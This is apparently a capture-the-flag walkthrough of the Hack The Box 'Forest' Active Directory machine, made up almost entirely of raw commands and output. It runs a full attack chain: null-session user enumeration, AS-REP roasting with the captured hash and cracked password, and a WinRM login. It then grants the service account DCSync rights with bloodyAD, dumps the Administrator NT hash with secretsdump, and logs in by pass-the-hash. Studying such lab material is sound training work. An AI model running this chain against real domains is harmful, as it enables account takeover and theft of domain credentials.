# Forest

└──╼ [★]$ sudo nmap -sCV 10.129.15.180
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org/) ) at 2026-06-17 14:01 EDT
Nmap scan report for 10.129.15.180
Host is up (0.0087s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
53/tcp   open  domain       Simple DNS Plus
88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-06-17 18:08:06Z)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2026-06-17T18:08:07
|_  start_date: 2026-06-17T18:06:30
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|*clock-skew: mean: 2h26m34s, deviation: 4h02m32s, median: 6m32s
| smb-os-discovery:
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|*  System time: 2026-06-17T11:08:11-07:00

cme smb 10.129.15.180 -u '' -p '' --shares
SMB         10.129.15.180   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.15.180   445    FOREST           [+] htb.local\:
SMB         10.129.15.180   445    FOREST           [-] Error enumerating shares: STATUS_ACCESS_DENIED

└──╼ [★]$ cme smb 10.129.15.180 -u '' -p '' --users
SMB         10.129.15.180   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.15.180   445    FOREST           [+] htb.local\:
SMB         10.129.15.180   445    FOREST           -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.129.15.180   445    FOREST           Administrator                 2021-08-31 00:51:58 0       Built-in account for administering the computer/domain
SMB         10.129.15.180   445    FOREST           Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.129.15.180   445    FOREST           krbtgt                        2019-09-18 10:53:23 0       Key Distribution Center Service Account
SMB         10.129.15.180   445    FOREST           DefaultAccount                <never>             0       A user account managed by the system.
SMB         10.129.15.180   445    FOREST           $331000-VK4ADACQNUCA          <never>             0
SMB         10.129.15.180   445    FOREST           SM_2c8eef0a09b545acb          <never>             0
SMB         10.129.15.180   445    FOREST           SM_ca8c2ed5bdab4dc9b          <never>             0
SMB         10.129.15.180   445    FOREST           SM_75a538d3025e4db9a          <never>             0
SMB         10.129.15.180   445    FOREST           SM_681f53d4942840e18          <never>             0
SMB         10.129.15.180   445    FOREST           SM_1b41c9286325456bb          <never>             0
SMB         10.129.15.180   445    FOREST           SM_9b69f1b9d2cc45549          <never>             0
SMB         10.129.15.180   445    FOREST           SM_7c96b981967141ebb          <never>             0
SMB         10.129.15.180   445    FOREST           SM_c75ee099d0a64c91b          <never>             0
SMB         10.129.15.180   445    FOREST           SM_1ffab36a2f5f479cb          <never>             0
SMB         10.129.15.180   445    FOREST           HealthMailboxc3d7722          2019-09-23 22:51:31 0
SMB         10.129.15.180   445    FOREST           HealthMailboxfc9daad          2019-09-23 22:51:35 0
SMB         10.129.15.180   445    FOREST           HealthMailboxc0a90c9          2019-09-19 11:56:35 0
SMB         10.129.15.180   445    FOREST           HealthMailbox670628e          2019-09-19 11:56:45 0
SMB         10.129.15.180   445    FOREST           HealthMailbox968e74d          2019-09-19 11:56:56 0
SMB         10.129.15.180   445    FOREST           HealthMailbox6ded678          2019-09-19 11:57:06 0
SMB         10.129.15.180   445    FOREST           HealthMailbox83d6781          2019-09-19 11:57:17 0
SMB         10.129.15.180   445    FOREST           HealthMailboxfd87238          2019-09-19 11:57:27 0
SMB         10.129.15.180   445    FOREST           HealthMailboxb01ac64          2019-09-19 11:57:37 0
SMB         10.129.15.180   445    FOREST           HealthMailbox7108a4e          2019-09-19 11:57:48 0
SMB         10.129.15.180   445    FOREST           HealthMailbox0659cc1          2019-09-19 11:57:58 0
SMB         10.129.15.180   445    FOREST           sebastien                     2019-09-20 00:29:59 0
SMB         10.129.15.180   445    FOREST           lucinda                       2019-09-20 00:44:13 0
SMB         10.129.15.180   445    FOREST           svc-alfresco                  2026-06-17 18:11:11 0
SMB         10.129.15.180   445    FOREST           andy                          2019-09-22 22:44:16 0
SMB         10.129.15.180   445    FOREST           mark                          2019-09-20 22:57:30 0
SMB         10.129.15.180   445    FOREST           santi                         2019-09-20 23:02:55 0
SMB         10.129.15.180   445    FOREST           [*] Enumerated 31 local users: HTB

└──╼ [★]$ cat users.txt
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi

impacket-GetNPUsers htb.local/ -dc-ip 10.129.15.180 -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Name          MemberOf                                                PasswordLastSet             LastLogon                   UAC

---

svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  2026-06-17 15:02:13.619437  2026-06-17 14:58:50.493911  0x410200

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
$krb5asrep$23$svc-alfresco@HTB.LOCAL:040154244850832c7f1a2bbccb3849f7$6cc6ff863aa5fd2dae00ce03575b5550141131f710e432c2ffe30b8ed3ddc85d10d018ddefc6d3eb0700e28f78a49d5c94e64a4e8c562ace4fea9ae75ed2f932e43348b15d4a010bbd46ed50e268e3886f8953c75631889e854bc73e0883b93a3e4c4a7b2db062ef1e2bf1cca86b87ca91302ec5ab04c474e4b8917585d3d202078712d8a7c49a8b9f979a65a9b6ed7703df267e132d2829b60601fb5303759fa2305c62fa7b8268f315d535dad2c2d0955d2f5290dee686fe8846964414ca23b3375b77adbb713c74eb3aad48cd5a9df0579bb0d9d3a087d87360a3dfa3cff6460cc67a5d78

svc-alfresco:s3rvice

cme smb 10.129.15.180 -u svc-alfresco -p s3rvice
SMB         10.129.15.180   445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True) (Null Auth:True)
SMB         10.129.15.180   445    FOREST           [+] htb.local\svc-alfresco:s3rvice

evil-winrm -i 10.129.15.180 -u svc-alfresco -p s3rvice

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> ls
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> ls

```
Directory: C:\Users\svc-alfresco\Desktop
```

Mode                LastWriteTime         Length Name

---

- ar--- 6/17/2026 11:07 AM 34 user.txt

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> cat user.txt
7d44337f7bfd40e7c141e1a2e9461a7d

sudo ntpdate 10.129.15.180
2026-06-17 15:09:54.100621 (-0400) +393.550208 +/- 0.010527 10.129.15.180 s1 no-leap
CLOCK: time stepped by 393.550208

python3 [bloodhound.py](http://bloodhound.py/) -u svc-alfresco -p s3rvice -c all --zip -d htb.local -ns 10.129.15.180
sudo neo4j

impacket-GetUserSPNs htb.local/svc-alfresco:s3rvice -dc-ip 10.129.15.180 -request -usersfile users.txt
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
$krb5tgs$23$*krbtgt$HTB.LOCAL$krbtgt*$002d678d529067fbb6f4f10d0c541a65$28efdfb380c048e3c5ea7ed5f005958a1cac023ce9e38c7b45320425c10c63ee27bba0165132feaa593da588eda7ad67beeefc817a791d3725e8345f46d4a1e63eef53d12a09f7aede1afe19485bc58ac0f139bca0a8b7bc6d006bc49b3a4a4efc51123822df19ce9165248f5c987511e32be832a01548b6606bf21bdeca7429080b2341240f9ea3915a7fe9bd1630daa237ceb0169e5f7863765f98b9f5e130bf77ae13c488c43ddd97ef4d2203935895468760f94b5cb5e5d046b50e8072e5af002306cb72fdffa5f82d8ffd4c98716ef6d80d06be429c514efe4027426efe253f9cca5e62d117a6c4298b43cbc115788af1ebd64855abf58fe4e270da340001600e5d9d98287af007a10cda93edb479b434ee8366b081f94a31d4dddbe8240d7c6dc14d99a3d3a011af35fc54cafa42d6f31a78280398f177c794dbc35e5876daa53f000a05dfa0ca76903b67474fa5cb1a5fd362d06851c1fb44aefd74312d7a1dff8c7afdca05b1cb9468118b58c6ad28a1b16d32541d711e62580d1a0dc4d06c28102b1917e30ce38eb482ba9ee2686c2d5f2d5aafea2b47d4e6e686a9dc37ae01bd5f384e35a59191d74ef70b52499333eca45845b0ead0b15ac3a9d6b5b208db47772a58ff910dd5b33e9025a07dc0c8becc61a723b8117f5e1c5894ac8b8dc438d6709fdb664bf99886cbe82a4679dce01f8f5ed9ac45a451ea16cfd27fa30f1389245fe7b60a920b82661661806e2b5f6db3eb990e74669a2e01529525a42ab9e1991333d4a7c44d369487213a852f6b6d0a5f045df017ab674a88a6d2adaf05f8ddbe72cb2c2593d52d0ff88465fdc752a5699895dc4162d4506097ad4f46505355c86fda5ab8601244d1a559cc4258ac62511f773f7288d8787d557c80d9e03cf9ced031ec7f19ea76d17205ad87774b563d0d2e7584f886215a60bf39b0c956c3c4bd0a33bdb59c2174a3229f798fe55be9cddbd080f2442ebe6a45b9f8ad374094888083e18ed7e0d377144cc4ec65e8a63f44ed84931e0194f13ce044a29be162a4e50343b5b65a4e11bab60e12ad764f533d0f1c297f168e375ac3cf346118b663c0f6b84dadd2741bdd672811dbf97e7bff8526fa7dbce1f4c01e819dca86597267c0663bfdb0d57d126fa6881605f80ec65026c1b166ce38744fb549743d4a7c9f61ccb5daa6d3897eb208f702552d535816b53824c8dfa53a51dac499b52c937f2d898d4faea7e8fe910b3768668c837d45553618af6d303b03828ec93b920e48d9b37a3085fd2cd294a1d08b870722d5465d9b720fdb7834b7eb92e2e19701465079af1b62aeaaee134212cf9bc14f69e76b8383e2faa7f379ea76c537f31c20d60f8b5cd4fe2cde6e3b52bf

svc-alfresco is an account operator

bloodyAD --host 10.129.15.180 -d htb.local -u svc-alfresco -p 's3rvice' \
add groupMember 'Exchange Windows Permissions' svc-alfresco
[+] svc-alfresco added to Exchange Windows Permissions
┌─[us-dedivip-4]─[10.10.15.206]─[ronking37@htb-x6ii6ja0me]─[~]
└──╼ [★]$ bloodyAD --host 10.129.15.180 -d htb.local -u svc-alfresco -p 's3rvice' \
add dcsync svc-alfresco
[+] svc-alfresco is now able to DCSync
┌─[us-dedivip-4]─[10.10.15.206]─[ronking37@htb-x6ii6ja0me]─[~]
└──╼ [★]$ [secretsdump.py](http://secretsdump.py/) 'htb.local/svc-alfresco:s3rvice@10.129.15.180' -just-dc-user Administrator
Impacket v0.14.0.dev0+20260407.172353.7fc084ad - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::

evil-winrm -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6 -i 10.129.15.180

*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

```
Directory: C:\Users\Administrator\Desktop
```

Mode                LastWriteTime         Length Name

---

- ar--- 6/17/2026 11:07 AM 34 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
87db6a815b7e997fcbb5cf6951d30bfc